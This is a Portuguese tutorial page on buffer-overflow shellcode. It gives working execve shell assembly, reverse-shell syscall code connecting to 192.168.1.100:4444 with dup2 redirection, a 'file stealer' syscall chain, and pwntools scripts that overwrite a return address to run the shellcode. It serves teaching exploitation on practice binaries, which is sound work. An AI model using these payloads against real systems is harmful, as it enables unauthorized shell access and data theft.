---
title: "Buffer Overflow - Shellcode"
sidebar_position: 3
---

Shellcode é um **pequeno trecho de código em Assembly usado como payload (carga útil) em um ataque**. O código é muito pequeno por ser em assembly, portanto apenas poucos bytes são necessários, dependendo do shellcode.

Com shellcode, **fazemos o programa rodar funcionalidades que o programador não escreveu**. Normalmente, shellcode é utilizado para fazer uma chamada de API do Windows ou Syscall no Linux.

No C, estaríamos fazendo algo como:

```C
int main() {
    system("/bin/sh"); // Chama shell
    return 0;
}
```

O Shellcode é a versão compacta disso, em assembly, que pode ser injetada na memória através de um input. Ou seja, **Shellcode é código Assembly normal**, nada especial. É chamado de shellcode pois geralmente envolve abrir uma shell (interface entre usuário e serviços do sistema operacional, algo como o prompt de comando do Windows).

A razão pela qual Shellcode funciona é por que **o computador não diferencia dados e instruções**. Se o `RIP` apontar para uma região de memória com permissão de execução, o processador VAI tentar rodar os bytes que estiverem lá. Assim, colocamos o shellcode na Stack e falamos para a `RIP` executar aquilo.

Isso só funciona se a stack for executável, ou seja, se a proteção [NX](../../protections.mdx#nx-no-execute-ou-dep-data-execution-prevention) estiver desativada (`pwn checksec` mostra `NX unknown` ou `NX disabled`, e `Stack: Executable`). Com NX ativado, o caminho é [ROP](../rop/index.mdx).

## O que colocar no shellcode?

Podemos escrever várias coisas em assembly que são úteis como código injetável. Entre elas, temos:

1. **Syscall (Linux/Unix)** - O mais comum. Fazemos chamadas diretas ao kernel via instrução `syscall / int 0x80`. É simples, não depende de bibliotecas específicas e permite acessar todas as funcionalidades do Kernel.
2. **Chamada de API Windows** - Usamos as APIs do SO Windows ao invés de syscalls, pois os números das syscalls do Windows não são estáveis entre versões.
3. **Shellcode em estágios (stager)** - Um shellcode pequeno que lê um shellcode maior pela rede/stdin e o executa. Útil quando o espaço no buffer é pequeno.

Quando a stack não é executável, o shellcode não serve, e usamos **[ROP (Return-Oriented Programming)](../rop/index.mdx)**: em vez de injetar código, reutilizamos trechos de código do próprio programa.

Iremos focar em **Syscalls**.

## Syscalls

Syscalls são interfaces de fácil uso que **permitem que programas solicitem serviços do kernel do sistema operacional**, como **acesso a hardware**, **criação de processos**, **gerenciamento de arquivos**, etc. Para fazer uma syscall damos o **número da syscall** (operação que queremos), os **argumentos** e em seguida usamos o **comando syscall (x64) / int 0x80 (x86)**, como vemos abaixo.

```
;x86-64

mov rax, syscall_number  ; Número da syscall
mov rdi, arg1            ; Primeiro argumento
mov rsi, arg2            ; Segundo argumento
mov rdx, arg3            ; Terceiro argumento
mov r10, arg4            ; Quarto argumento (r10 em vez de rcx, pois a instrução syscall sobrescreve o rcx)
mov r8, arg5             ; Quinto argumento
mov r9, arg6             ; Sexto argumento
syscall                  ; Instrução para chamar o kernel
; O valor de retorno vem em rax (negativo = erro)

; x86

mov eax, syscall_number  ; Número da syscall
mov ebx, arg1            ; Primeiro argumento
mov ecx, arg2            ; Segundo argumento
mov edx, arg3            ; Terceiro argumento
; (quarto, quinto e sexto argumentos vão em esi, edi e ebp)
int 0x80                 ; Interrupção para chamar o kernel
; O valor de retorno vem em eax
```

Note que os registradores dos argumentos **não são os mesmos** da convenção de chamada de funções (`rdi, rsi, rdx, rcx, r8, r9`): o 4º argumento de uma syscall vai em `r10`, e em 32 bits as syscalls usam `ebx, ecx, edx...` enquanto as funções usam a stack.

Vamos falar de algumas syscalls importantes.

### execve - Executar Shell/programa

Código para cada arquitetura:

- `x86` - 11
- `x64` - 59

```nasm
; Executa execve("//bin/sh", NULL, NULL)
xor rsi, rsi                ; rsi = 0 (arg2: argv = NULL)
push rsi                    ; empilha 8 bytes zerados: será o \0 que termina a string
mov rdi, 0x68732f6e69622f2f ; "//bin/sh" em little endian (8 bytes exatos. A barra dupla é só para completar 8 bytes, e o Linux aceita)
push rdi                    ; empilha a string. Agora [rsp] = "//bin/sh\0"
mov rdi, rsp                ; arg1: pathname = ponteiro para a string na stack
xor rdx, rdx                ; arg3: envp = NULL
push 59                     ; rax = 59 (syscall execve). "push 59; pop rax" ocupa 3 bytes e não gera bytes nulos,
pop rax                     ; ao contrário de "mov rax, 59" (48 c7 c0 3b 00 00 00)
syscall
```

A função `execve` espera um **ponteiro** para uma string, não a string em si. Portanto, colocamos a string na stack primeiro (terminada em `\0`, por isso o `push rsi` com zero antes). Quando damos `push rdi`, `rsp` passa a apontar para o início da string, e copiamos esse ponteiro para `rdi`.

Para conferir como a string vira o número `0x68732f6e69622f2f`: `u64(b'//bin/sh')` no pwntools. É só a string lida como um inteiro little endian.

Repare que esse shellcode não tem bytes nulos (`00`), o que importa quando o input é lido por funções que param no `\0` (`strcpy`, `scanf("%s")`, etc). Por isso usamos `xor rsi, rsi` em vez de `mov rsi, 0` (que geraria `48 c7 c6 00 00 00 00`) e `push 59; pop rax` em vez de `mov rax, 59`. Se os bytes nulos não forem problema (ex: input lido com `read`), não precisa se preocupar. Confira com `asm(...)` no pwntools e procure por `\x00`.

### File Descriptors (fd)

File Descriptor é um número que representa um arquivo aberto. STDIN, STDOUT, STDERR são padrões do sistema, e os fd's de arquivos e sockets são atribuídos conforme necessidade.

- `STDIN (0)`  → Para RECEBER coisas. Normalmente teclado.
- `STDOUT (1)` → Para ENVIAR coisas. Normalmente tela/monitor.
- `STDERR (2)` → Para RECLAMAR de erros. Normalmente tela/monitor.
- `Arquivo (X)` → Para arquivo específico criado.
- `Socket (X)` → Para socket criado que permite se comunicar pela internet.

### write - Saída/Escrita

Código para cada arquitetura:

- `x86` - 4
- `x64` - 1

```nasm
; Escreve em arquivo/socket: write(fd, buf, count)
mov rax, 1       ; write
mov rdi, 1       ; fd (1 = stdout, ou o fd de um arquivo/socket aberto)
lea rsi, [msg]   ; buffer
mov rdx, len     ; tamanho
syscall
```

Exemplo:

```nasm
; write(1, "Hello\n", 6)
mov rax, 1       ; syscall 1 = write
mov rdi, 1       ; fd = STDOUT
lea rsi, [rel hello] ; endereço da string (rel = relativo ao rip, funciona em qualquer endereço. Útil em shellcode)
mov rdx, 6       ; length
syscall          ; chamada

mov rax, 60      ; exit(0), para não continuar executando os bytes da string como instruções
xor rdi, rdi
syscall

hello: db 'Hello', 0x0a
```

### read - Entrada/Leitura

Código para cada arquitetura:

- `x86` - 3
- `x64` - 0

```nasm
; Lê de entrada/socket
mov rax, 0       ; read
mov rdi, 0       ; fd (0 = stdin, ou o fd de um arquivo/socket aberto)
lea rsi, [buf]   ; buffer
mov rdx, 1024    ; tamanho máximo
syscall
```

Exemplo:

```nasm
section .bss
    buffer resb 100    ; Reserva 100 bytes

section .text
global _start
_start:
    mov rax, 0         ; read syscall
    mov rdi, 0         ; fd 0 = stdin (teclado)
    lea rsi, [buffer]  ; onde guardar
    mov rdx, 100       ; ler até 100 bytes
    syscall
    
    ; Agora [buffer] tem o que usuário digitou
```

### open - Abrir arquivos

Código para cada arquitetura:

- `x86` - 5
- `x64` - 2

```nasm
; Abre arquivo
mov rax, 2       ; open
lea rdi, [path]  ; caminho
xor rsi, rsi     ; flags=O_RDONLY
syscall
mov [file_fd], rax
```

Exemplo:

```nasm
section .data
    filename db '/etc/passwd', 0

section .text
global _start
_start:
    mov rax, 2         ; open syscall
    lea rdi, [filename]; nome do arquivo
    mov rsi, 0         ; O_RDONLY = apenas leitura
    syscall            ; retorna fd em rax
    mov rbx, rax       ; Salvar fd em rbx, pois rax será sobrescrito
    
    ; rbx contém agora o file descriptor (número do arquivo), que pode ser utilizado em outras funções
```

### exit - Saída controlada

Código para cada arquitetura:

- `x86` - 1
- `x64` - 60

```nasm
; Sai sem crash
mov rax, 60      ; exit
mov rdi, 0     ; status=0 (sucesso)
syscall
```

### dup2 - Redirecionamento

O `dup2(oldfd, newfd)` faz `newfd` virar uma cópia de `oldfd`. Se fazemos `dup2(socket_fd, 1)`, isso é igual a dizer: "Quando o programa escrever na tela (1), na verdade escreva no socket (socket_fd)". É o coração de um reverse shell: fazemos `dup2(sock, 0)`, `dup2(sock, 1)` e `dup2(sock, 2)` antes do `execve("/bin/sh")`, e a shell passa a ler e escrever pela rede.

Código para cada arquitetura:

- `x86` - 63
- `x64` - 33

```nasm
; Redireciona fd para outro
mov rax, 33      ; dup2(oldfd, newfd)
mov rdi, rbx     ; oldfd: socket fd criado antes (guardado em rbx)
mov rsi, 0       ; newfd: STDIN. Repita com 1 e 2 para STDOUT e STDERR
syscall
```

### socket + connect - Reverse Shell

Imagine a internet como um sistema postal. Criar um `socket` é criar um "envelope" para a sua carta.

```nasm
mov rax, 41        ; syscall 41 = socket
mov rdi, 2         ; "Quero um envelope para carta normal" (AF_INET = IPv4)
mov rsi, 1         ; "Com entrega garantida" (SOCK_STREAM = TCP)
mov rdx, 0         ; "Método padrão de entrega" (protocolo 0 = padrão para TCP)
syscall            ; Retorna: "Aqui está seu envelope número X salvo em rax"
mov rbx, rax       ; Salva número do socket em rbx, pois rax será sobrescrito
```

Código para cada arquitetura:

- Socket `x64` - 41
- Socket `x86` - 359 (kernels a partir do 4.3). Em kernels mais antigos, as operações de socket em 32 bits passam todas pela syscall `socketcall` (102), com o número da operação em `ebx` (`SYS_SOCKET` = 1, `SYS_CONNECT` = 3, ...) e um ponteiro para os argumentos em `ecx`.

Fazer `connect` é como enviar essa carta.

```nasm
mov rax, 42        ; syscall 42 = connect
mov rdi, rbx         ; "Usando este envelope número X" (socket_fd criado antes)
lea rsi, [endereco]; "Para este endereço específico"
mov rdx, 16        ; "Tamanho padrão de endereço"
syscall            ; *Correio pega a carta*

; O endereço (struct sockaddr_in, 16 bytes)
endereco:
dw 2                  ; sin_family = AF_INET - 2 bytes
dw 0x5c11             ; sin_port = 4444 = 0x115c em network byte order (big endian). Como o dw grava em little endian, escrevemos os bytes invertidos: 0x5c11 vira "11 5c" na memória - 2 bytes
dd 0x6401a8c0         ; sin_addr = 192.168.1.100, que na memória precisa ser "c0 a8 01 64". Pelo mesmo motivo, escrevemos o número invertido - 4 bytes
times 8 db 0          ; sin_zero: padding para a struct ter 16 bytes
```

Conferindo no Python: `p16(4444, endian='big')` dá `b'\x11\x5c'` e `p32(0x5c11)` também dá `b'\x11\x5c\x00\x00'`. Para o IP, `bytes([192,168,1,100])` = `b'\xc0\xa8\x01\x64'` = `p32(0x6401a8c0)`. Na prática, use `shellcraft.connect('192.168.1.100', 4444)` e deixe o pwntools montar isso.

Código para cada arquitetura:

- Connect `x64` - 42
- Connect `x86` - 362 (kernels a partir do 4.3), ou `socketcall` (102) com `ebx = 3` (`SYS_CONNECT`)

Com `socket` e `connect`, estabelecemos uma conexão. Para enviar dados, por exemplo, temos que usar `write`: `write(socket_fd, [dados], tamanho)`

### Combinações de Syscalls

Abrir Shell / Backdoor simples
1. execve
   
Reverse Shell

1. socket() - cria socket
2. connect() - conecta ao atacante
3. dup2() - redireciona STDIN/OUT/ERR para socket  
4. execve() - executa /bin/sh
   
File Stealer

1. open() - abre arquivo
2. read() - lê conteúdo
3. write() - escreve para socket/arquivo

### Outras Syscalls

Para ver cada syscall, seu código, parâmetros e o que faz, recomendo olhar a [Tabela de Syscalls para kernel Linux](../../../extra/syscall-table.mdx).

Outros materiais também estão disponíveis na internet:

- [Tabela de Syscalls Linux x86 - IME USP](https://www.ime.usp.br/~kon/MAC211/syscalls.html)
- [Tabela de Syscalls Linux x86-64 - Filippo](https://filippo.io/linux-syscall-table/)
- [Tabela de Syscalls Linux x86-64 - Rchapman](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

## NOPs

NOP (no operation) é uma instrução do assembly que faz exatamente o que parece: nada. Ela apenas passa para a próxima instrução. Isso é muito bom para shellcodes, pois nos permite ter uma grande margem de erro para acertar onde começa a execução do shellcode: se o `RIP` cair em qualquer lugar da sequência de NOPs (o *NOP sled*), ele "escorrega" até o shellcode. Em assembly a instrução é `nop`, e em bytes, `0x90`.

Isso é útil porque o endereço exato do buffer na stack pode variar um pouco entre o GDB e a execução normal (o GDB adiciona variáveis de ambiente, como `LINES` e `COLUMNS`, que deslocam a stack). Com um NOP sled grande, não precisamos acertar o endereço exato.

Assim, se quisermos fazer um shellcode com NOPs de padding:

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = b'\x90' * 240                 # NOPs
payload += asm(shellcraft.sh())         # shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4 + 120)        # endereço do buffer + metade da largura dos nops (margem de erro)

log.info(p.clean())
p.sendline(payload)
p.interactive()
```

Tome cuidado, pois NOPs podem ter um byte diferente em outras arquiteturas. Assim, você pode usar `nop = asm(shellcraft.nop())`.

## Criando um Shellcode

Antes de criar o shellcode, vamos montar um programa para testar shellcode em C:

```C
int main(void) {
    // Array local fica na pilha (stack)
    char shellcode[] = "[insira seu shellcode aqui]";
    
    ((void (*)(void))shellcode)();
    return 0;
}
```

Esse programa deve ser compilado com as flags:
- `-z execstack` - Torna a pilha (stack) executável no binário compilado. Permite executar shellcode (desativa NX/DEP).
- `-fno-stack-protector` - Desativa o Stack Canary (não é necessário para este teste, mas é o que normalmente se faz em binários de treino).
- `-m32` - Define arquitetura de 32-bit (nosso shellcode de exemplo usa `int 0x80`, que é de 32 bits). Pode precisar de `sudo apt install gcc-multilib`.

Assim, compilamos com: `gcc testador.c -o testador -z execstack -fno-stack-protector -m32`

(Obs: o cast `(void (*)(void))shellcode` é explícito, então o compilador não reclama. Se aparecer algum warning sobre ponteiros, adicione `-Wno-incompatible-pointer-types`.)

Agora vamos criar um Shellcode básico em assembly que simula a função `exit()` em C com o parâmetro `10` (isso faz o programa encerrar mostrando o código de status `10`). Vamos salvar o programa como `exit.asm`.

```nasm
    section .text     ; Define que essa região do código é para as instruções
    global _start     ; Define que o programa começa por _start

_start:
    mov eax, 1        ; eax ( código da syscall ) = 1 ( exit )
    mov ebx, 10       ; ebx ( parâmetro da syscall ) = 10
    int 0x80          ; Chama a syscall ( exit(10) )
```

Para compilarmos esse programa, usaremos o `nasm` e para linkar o objeto montado pelo nasm, usaremos o `ld`.

```
nasm -f elf32 exit.asm -o exit.o
ld -m elf_i386 exit.o -o exit
```

Podemos executar o programa com `./exit` e ver o código de saída do programa com `echo $?`. Assim, vemos que o programa realmente encerra com o número 10.

O programa, após compilado, vira bytes em disco. **Esses bytes de instrução são nosso shellcode**. Para pegar os bytes do programa em disco, usamos `objdump -d exit`:

```bash
exit:     file format elf32-i386

Disassembly of section .text:

08049000 <_start>:
 8049000:       b8 01 00 00 00          mov    $0x1,%eax
 8049005:       bb 0a 00 00 00          mov    $0xa,%ebx
 804900a:       cd 80                   int    $0x80
```

No meio temos os bytes, na direita as respectivas instruções. Portanto, os bytes do programa são:

```
b8 01 00 00 00
bb 0a 00 00 00
cd 80
```

Colocando eles no nosso testador:

```c
int main(void) {
    // Array local fica na pilha (stack)
    char shellcode[] = "\xb8\x01\x00\x00\x00\xbb\x0a\x00\x00\x00\xcd\x80";
    
    ((void (*)(void))shellcode)();
    return 0;
}
```

Compilando e executando:

```bash
./testador
echo $? => Imprime 10
```

Podemos ver que o código de saída é 10, como esperado.

## ShellCode + pwntools

O pwntools possui a ferramenta `shellcraft`, que tem shellcodes prontos para uso. **O shellcode dado vai estar em assembly** e **temos que transformar em bytes** usando a função `asm()`.

O shellcraft possui inúmeros shellcodes prontos. Se quiser, veja [Principais Funções Shellcraft](../../../extra/shellcraft.mdx). Abaixo, temos alguns shellcodes populares.

```py
# Shellcodes prontos populares
shellcraft.sh()           # /bin/sh (Chama shell)
shellcraft.cat('file')    # cat file
shellcraft.dupsh()        # Duplica shell para fd
shellcraft.echo('text')   # Imprime texto
shellcraft.exit()         # Sai do processo
```

Como exemplo vamos fazer o mesmo código que fizemos antes de `exit(10)`, mas no pwntools.

```py
from pwn import *

# Gerar shellcode
shellcode = asm(shellcraft.exit(10))

# Ver bytes
print(f"Shellcode: {len(shellcode)} bytes")
print(hexdump(shellcode))

# Ver instruções
print("\nInstruções Assembly:")
print(disasm(shellcode))

# Executar (run_shellcode())
p = run_shellcode(shellcode)
p.interactive()
```

## Sumário de uso BOF Shellcode

Basicamente:

1. Identifique se é possível fazer BOF e se a stack é executável (`pwn checksec`: NX desativado)
2. Descubra o endereço do buffer na stack (no GDB: `p $rsp`, `x/20gx $rsp`, ou procure pelo seu input com `search AAAA` no pwndbg). Com PIE/ASLR, a stack muda a cada execução, então o endereço precisa ser vazado (ou o programa já o imprime, como é comum em desafios introdutórios)
3. Coloque o **Shellcode no Input** + **Padding até `return address`** + **Endereço do início do Shellcode na stack**
4. Sim, acabamos de mandar o `RIP` executar instrução na stack.

Se o buffer for pequeno demais para o shellcode, uma alternativa é colocar o shellcode **depois** do `return address` (a stack continua existindo ali) e apontar o `return address` para `rsp` logo após o `ret` (um gadget `jmp rsp` resolve isso sem precisar saber o endereço da stack).

Se o `read`/`scanf` parar em certos bytes (ex: `\n`, `\0`, espaço), confira se o shellcode não contém esses bytes: `asm(shellcraft.sh())` não tem bytes nulos, e `encode(sc, avoid=b'\n ')` gera uma versão sem os bytes proibidos.

Exemplo com pwntools, abrindo uma shell (`shellcraft.sh()`):

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = asm(shellcraft.sh())          ## Shellcode
payload = payload.ljust(312, b'A')      ## Padding
payload += p32(0xffffcfb4)              ## Endereço do Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```